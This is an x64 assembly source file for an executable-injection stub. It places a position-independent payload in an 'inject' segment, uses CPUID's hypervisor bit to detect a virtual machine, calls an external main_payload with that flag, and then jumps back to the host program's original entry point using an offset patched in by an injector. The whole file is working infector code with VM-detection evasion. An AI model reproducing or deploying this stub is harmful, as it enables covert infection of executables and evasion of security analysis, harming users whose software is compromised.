public __start_code
public delta
extern main_payload:proc

inject segment read execute

__start_code label BYTE
payload proc

    call _next
_next:
    pop rbp
    sub rbp, _next - payload

    sub rsp, 40           ; 32 bytes shadow space + 8 for alignment

    ; Check if running in a VM
    xor eax, eax
    inc eax
    cpuid
    bt ecx, 31          ; check hypervisor bit
    jz _not_vm           ; if not set, jump to not_vm

    ; If running in a VM, call main_payload with 1 argument
    mov rcx, 1           ; set rcx to 1 to indicate VM
    call main_payload

    jmp _restore_state

_not_vm:
    mov rcx, 0           ; set rcx to 0 to indicate non-VM
    call main_payload

_restore_state:
    add rsp, 40           ; free shadow space

    ; calculate the Original Entry Point (OEP) and jump to it
    mov rbx, [rbp + (delta - payload)]  ; rbx = delta (stored offset to OEP)
    add rbx, rbp                        ; rbx = original entry point (absolute)
    jmp rbx
vars:
    delta label QWORD
    dq 0        ; /!\ THIS IS A PLACEHOLDER /!\
                ; The actual delta will be patched by the injector
payload endp


inject ends
END
